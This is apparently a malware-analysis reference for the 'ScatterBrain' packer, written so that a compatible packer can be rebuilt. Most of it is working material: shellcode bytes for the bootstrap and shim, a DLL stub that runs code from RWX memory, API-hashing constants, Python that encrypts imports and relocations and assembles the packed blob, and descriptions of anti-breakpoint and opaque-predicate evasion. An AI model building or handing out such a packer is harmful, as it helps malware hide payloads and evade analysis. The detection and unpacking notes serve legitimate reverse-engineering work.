# ScatterBrain Packer — Implementation Reference

This document contains enough detail to reimplement a compatible packer that produces binaries loadable by the ScatterBrain reflective loader. See also:

- [packed_pe_analysis.md](packed_pe_analysis.md) — blob format, header fields, section table, import cipher, thunk encoding
- [execution_walkthrough.md](execution_walkthrough.md) — end-to-end runtime flow

---

## Architecture Overview

The packer produces a **host DLL** that contains:
1. A minimal DllMain that spawns a thread
2. A thread function (`spawn_reflective_loader`) that copies a blob to RWX memory and executes it
3. A contiguous data block in `.rdata` containing: bootstrap + packed blob + shim + reflective loader

At runtime, the thread copies the data block to RWX memory and jumps to the bootstrap, which uses a call-pop trick to pass the blob address to the reflective loader. The loader unpacks the inner PE into a separate RWX allocation and calls its entry point.

---

## What the Packer Must Produce

### Host DLL Structure

```
.text section:
  DllEntryPoint     — standard CRT entry (optional, or minimal stub)
  DllMain           — CreateThread(spawn_reflective_loader), CloseHandle, return TRUE
  spawn_reflective_loader — VirtualAlloc(NULL, 0x100000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                            memmove(rwx, &bootstrap_label, total_block_size)
                            call rwx(0)
                            if (!result) ExitThread(0)

.rdata section (or any read-only section):
  bootstrap_label:
    ┌─────────────────────────────────────────────┐
    │ bootstrap shellcode        (15 bytes)        │
    │ packed PE blob             (variable)         │
    │ shim shellcode             (18 bytes)         │
    │ reflective_loader          (~2025 bytes)      │
    └─────────────────────────────────────────────┘
```

The `memmove` size must equal the total size of bootstrap + blob + shim + loader.

### Bootstrap Shellcode (15 bytes)

```asm
push    rbp                     ; 55
mov     rbp, rsp                ; 48 89 E5
push    rcx                     ; 51          ; save original arg (0)
push    <blob_size_imm32>       ; 68 xx xx xx xx  ; e.g. push 0x19676
call    <shim_offset>           ; E8 xx xx xx xx  ; relative call to shim
; --- blob starts immediately after this call instruction ---
; The return address pushed by CALL = address of blob start
```

The `call` target is the shim, computed as: `shim_offset = (shim_va - (call_va + 5))`.

### Shim Shellcode (18 bytes)

```asm
mov     rcx, rsp                ; 48 89 E1    ; rcx -> stack: [blob_addr, blob_size, saved_rcx, saved_rbp, ...]
sub     rsp, 0x28               ; 48 83 EC 28 ; shadow space for x64 calling convention
call    <reflective_loader_offset> ; E8 xx xx xx xx ; relative call
add     rsp, 0x28               ; 48 83 C4 28
ret                             ; C3
```

The loader receives `rcx = rsp`, where `[rcx]` = blob address (pushed by call-pop) and `[rcx+8]` = blob size.

### Reflective Loader

The loader is position-independent shellcode (~2025 bytes). It is compiled separately and embedded verbatim. It performs 9 stages — see [execution_walkthrough.md](execution_walkthrough.md) for the full breakdown.

Key APIs resolved by hash at runtime (no imports needed):
- `LoadLibraryA` (hash `0xBDA26FE6`)
- `GetProcAddress` (hash `0xA16DC157`)
- `VirtualAlloc` (hash `0x24A6650A`)
- `Sleep` (hash `0x27BE7673`)

Module hash for `kernel32.dll`: `0xFD5B1261`

Hash algorithm: ROR-8 + ADD + XOR with constant `0x7C35D9A3`:
- Module hash: wide char (UTF-16LE), case-insensitive (`| 0x20`)
- Export hash: ASCII, case-sensitive

```python
def hash_name(name_bytes, wide=False):
    h = 0
    for b in name_bytes:
        if wide:
            b = b | 0x20  # case-insensitive
        h = ((h >> 8) | (h << 24)) & 0xFFFFFFFF  # ROR 8
        h = (h + b) & 0xFFFFFFFF
        h ^= 0x7C35D9A3
    return h
```

---

## Packed PE Blob Format (`sb_packed_pe_hdr`)

Total header: **0x38 bytes** (NOT 0x40 — see note below). Section table follows immediately.

### Header Layout

| Offset | Size | Field | How to Compute |
|--------|------|-------|----------------|
| `0x00` | DWORD | `magic0` | Random seed. Also used as rolling XOR key for relocs + imports. |
| `0x04` | DWORD | `magic1` | `magic0 ^ 0x7C35D9A3` (validation constant) |
| `0x08` | DWORD | `size_of_image` | From input PE's `OptionalHeader.SizeOfImage` |
| `0x0C` | DWORD | `flags` | 0 = normal, 8 = Sleep(INFINITE) after DllMain |
| `0x10` | QWORD | `image_base` | From input PE's `OptionalHeader.ImageBase` |
| `0x18` | DWORD | `reloc_dir_rva` | From input PE's relocation data directory RVA (0 if no relocs) |
| `0x1C` | DWORD | `reloc_dir_size` | From input PE's relocation data directory size |
| `0x20` | DWORD | `import_desc_rva` | RVA where packer writes the custom import descriptor table |
| `0x24` | DWORD | `iat_size` | Size of import descriptor table region to zero after resolution |
| `0x28` | DWORD | `entry_point_rva` | From input PE's `AddressOfEntryPoint` |
| `0x2C` | WORD  | `pe_magic` | `0x20B` for PE32+, `0x10B` for PE32 |
| `0x2E` | WORD  | (padding) | Can be anything |
| `0x30` | DWORD | `num_sections` | Number of section entries following |
| `0x34` | DWORD | `checksum` | From input PE's `OptionalHeader.CheckSum` (or computed) |

### Section Table (at offset 0x38)

Array of `num_sections` entries, each 12 bytes:

| Offset | Size | Field | Description |
|--------|------|-------|-------------|
| `+0` | DWORD | `dest_rva` | Destination RVA in mapped image |
| `+4` | DWORD | `src_offset` | Offset within blob where raw data starts |
| `+8` | DWORD | `raw_size` | Number of bytes to copy |

Sections are packed contiguously in the blob after the header + section table. The first section's `src_offset` = `0x38 + (num_sections * 12)`.

**CRITICAL**: The IDA struct `sb_packed_pe_hdr` has sizeof=0x40 which overlaps with the section table. The field shown as `prng_fill_size` at offset 0x38 is actually `section[0].dest_rva`. The real header ends at 0x38.

---

## Packing an Input PE: Step by Step

### Step 1: Parse Input PE

Read the input PE (the payload to pack) with lief or pefile:
- `SizeOfImage`, `ImageBase`, `AddressOfEntryPoint`, `CheckSum`
- Section table: VirtualAddress, SizeOfRawData, PointerToRawData
- Relocation directory: RVA and Size (can be 0 if not needed)
- Import table: DLL names, function names, hints

### Step 2: Build Section Data

For each section in the input PE, extract its raw data. Pack sections contiguously:

```
section_data = b''
section_entries = []
current_offset = 0x38 + (num_sections * 12)  # after header + section table

for sec in input_pe.sections:
    raw = sec.content
    section_entries.append({
        'dest_rva': sec.virtual_address,
        'src_offset': current_offset,
        'raw_size': len(raw),
    })
    section_data += raw
    current_offset += len(raw)
```

### Step 3: Build Custom Import Descriptors

The packer must create its own import descriptor table in the custom format (same layout as `IMAGE_IMPORT_DESCRIPTOR`, 20 bytes each). Place this table and the associated ILT entries, name strings in one of the sections (typically the data section).

**Encrypt import names** using the rolling XOR cipher (see below).

Import descriptor layout at `import_desc_rva`:

```
For each imported DLL:
  [0x00] DWORD  ilt_rva          — points to array of IMAGE_THUNK_DATA64 entries
  [0x04] DWORD  0                — timestamp (unused)
  [0x08] DWORD  0                — forwarder chain (unused)
  [0x0C] DWORD  name_rva         — RVA of encrypted DLL name string
  [0x10] DWORD  thunk_rva        — RVA where loader writes resolved thunk pointers

Terminator: 20 zero bytes (descriptor with ilt_rva == 0)

Each ILT entry (QWORD):
  bit 63 set:   ordinal import — low 16 bits = ordinal
  bit 63 clear: name import — value = RVA to [2-byte hint | encrypted name]
  Terminator: 0x0000000000000000
```

### Step 4: Encrypt Import Names (Rolling XOR Cipher)

The cipher is stateful across ALL names in sequence. Order: DLL name, then each function name for that DLL, then next DLL name, etc.

```python
def encrypt_imports(descriptors, initial_key):
    """
    Encrypt DLL names and function names in-place.
    Returns final key state and list of encrypted byte arrays.
    """
    key = initial_key

    for desc in descriptors:
        # Encrypt DLL name
        desc['enc_dll_name'], key = rolling_xor_encrypt(desc['dll_name'], key)

        for func in desc['functions']:
            if func['type'] == 'name':
                # Encrypt function name
                func['enc_name'], key = rolling_xor_encrypt(func['name'], key)

    return key


def rolling_xor_encrypt(plaintext_str, key):
    """
    Encrypt a null-terminated string. Returns (encrypted_bytes, new_key).

    IMPORTANT: key update uses the ENCRYPTED byte, not the plaintext byte.
    The cipher is: enc = plain ^ (key & 0xFF), then key evolves using enc.
    To reverse: plain = enc ^ (key & 0xFF), key evolves using enc.
    """
    result = bytearray()
    for ch in plaintext_str.encode('ascii') + b'\x00':
        enc_byte = ch ^ (key & 0xFF)
        result.append(enc_byte)

        # Key update uses the ENCRYPTED byte (sign-extended to int8)
        enc_signed = enc_byte if enc_byte < 128 else enc_byte - 256
        key = ((key << 24) & 0xFFFFFFFF) | ((enc_signed + ((key >> 8) & 0xFFFFFF)) & 0xFFFFFFFF)

        if ch == 0:  # plaintext null terminator
            break

    return bytes(result), key
```

**WARNING**: The key update formula uses the **encrypted** byte (pre-decryption), sign-extended via C's `(char)` cast. Getting this wrong breaks the entire import chain since the key is stateful.

### Step 5: Assemble the Blob

```python
import struct

def build_blob(magic0, size_of_image, flags, image_base, reloc_rva, reloc_size,
               import_desc_rva, iat_size, entry_rva, pe_magic, checksum,
               section_entries, section_data):

    magic1 = magic0 ^ 0x7C35D9A3
    num_sections = len(section_entries)

    # Header (0x38 bytes)
    header = struct.pack('<II', magic0, magic1)          # 0x00
    header += struct.pack('<I', size_of_image)            # 0x08
    header += struct.pack('<I', flags)                    # 0x0C
    header += struct.pack('<Q', image_base)               # 0x10
    header += struct.pack('<II', reloc_rva, reloc_size)   # 0x18
    header += struct.pack('<II', import_desc_rva, iat_size) # 0x20
    header += struct.pack('<I', entry_rva)                # 0x28
    header += struct.pack('<HH', pe_magic, 0)             # 0x2C
    header += struct.pack('<II', num_sections, checksum)  # 0x30

    assert len(header) == 0x38

    # Section table
    sec_table = b''
    for entry in section_entries:
        sec_table += struct.pack('<III', entry['dest_rva'], entry['src_offset'], entry['raw_size'])

    return header + sec_table + section_data
```

### Step 6: Assemble the Full Data Block

```
data_block = bootstrap_shellcode + blob + shim_shellcode + reflective_loader_code
```

Fix up the relative call offsets in bootstrap (call to shim) and shim (call to loader).

### Step 7: Build the Host DLL

Create a PE DLL with:
- `.text`: DllMain + spawn_reflective_loader (compiled code)
- `.rdata`: the data block from step 6

`spawn_reflective_loader` must reference:
- `&data_block` — the address of the bootstrap label in `.rdata`
- `sizeof(data_block)` — the total size for `memmove`

---

## Relocation Encryption (if input PE has relocations)

If the input PE has base relocations, they must be encrypted with the same rolling XOR cipher.

The relocation directory uses standard `IMAGE_BASE_RELOCATION` block format:
- Each block: `{ DWORD page_rva; DWORD block_size; WORD entries[]; }`
- Each entry WORD is XOR'd with the rolling key

Key evolution per relocation entry:
```python
raw_entry = original_entry_word
xored = raw_entry ^ (key & 0xFFFF)
key = ((key << 16) & 0xFFFFFFFF) | ((raw_entry + (key >> 16)) & 0xFFFF)
# Store xored as the encrypted entry
```

The key starts at `magic0` and evolves through all relocation entries before being used for imports.

Supported relocation types:
- Type 3 (`IMAGE_REL_BASED_HIGHLOW`): 32-bit fixup
- Type 10 (`IMAGE_REL_BASED_DIR64`): 64-bit fixup
- Type 0: padding (skip)

---

## Obfuscated Call Thunks (built by loader at runtime, not by packer)

The packer does NOT build thunks — the loader does this at runtime. But for reference, each resolved import gets a thunk like:

```
[optional 1-byte junk prefix: E8/E9/FF/48/75 based on key%5]
48 B8 <8 bytes: -api_addr>    ; mov rax, -api_addr
48 F7 D8                      ; neg rax  (rax = api_addr)
48 FF E0                      ; jmp rax
```

The thunk pointer is written into the thunk dispatch table (at `thunk_rva` from the import descriptor).

Anti-breakpoint: if the resolved API address starts with `0xCC` (int 3 / software breakpoint), the loader adjusts the stored address by `+key` bytes to skip past the breakpoint.

---

## Opaque Predicate Obfuscation (applied to loader shellcode)

The reflective loader has 40 opaque predicates inserted throughout its code. Each is a 5-byte pattern:

```
Jcc_true  +3     (2 bytes)   — always-taken branch, skips 3 bytes ahead
Jcc_false +1     (2 bytes)   — complementary (never-taken), targets same addr
junk_byte        (1 byte)    — E8 (CALL) or E9 (JMP) to confuse disassemblers
```

Detection: `(byte[0] ^ byte[2]) == 1` and both in `0x70-0x7F`, `byte[1] == 0x03`, `byte[3] == 0x01`, `byte[4] in {0xE8, 0xE9}`.

The packer inserts these at chosen locations in the loader shellcode. They don't affect execution (both jumps land at the same address past the junk byte) but break linear disassembly.

---

## Constants Summary

| Constant | Value | Usage |
|----------|-------|-------|
| XOR validation | `0x7C35D9A3` | `magic0 ^ magic1` must equal this |
| PRNG constant | `0xEF70ABEA` | Used in PRNG fill: `state = (state >> 16) + 0xEF70ABEA + (state << 16)` |
| PE32+ magic | `0x020B` | Validated by loader |
| VirtualAlloc extra | `0x4000` | Loader allocates `size_of_image + 0x4000` bytes |

---

## File References

| File | What It Contains |
|------|-----------------|
| `scripts/sb_extract.py` | Complete extraction/unpacking implementation (Python) |
| `scripts/sb_reconstruct_pe.py` | Reconstruct valid PE from extracted data |
| `scripts/deobf_sweep.py` | Opaque predicate detection and removal |
| `scripts/hash_resolve.py` | API hash brute-forcer |
| `scripts/profiles/scatterbrain.json` | Hash algorithm config + known hashes |
| `packed_blob.bin` | Example packed blob (104,054 bytes) |
| `sb_extract.json` | Example parsed metadata |
| `inner_pe.dll.pe` | Example reconstructed PE |
| [packed_pe_analysis.md](packed_pe_analysis.md) | Detailed blob format analysis |
| [execution_walkthrough.md](execution_walkthrough.md) | Runtime execution flow |

Example malware-derived binaries and full databases are stored in a private archive for vetted sharing only.
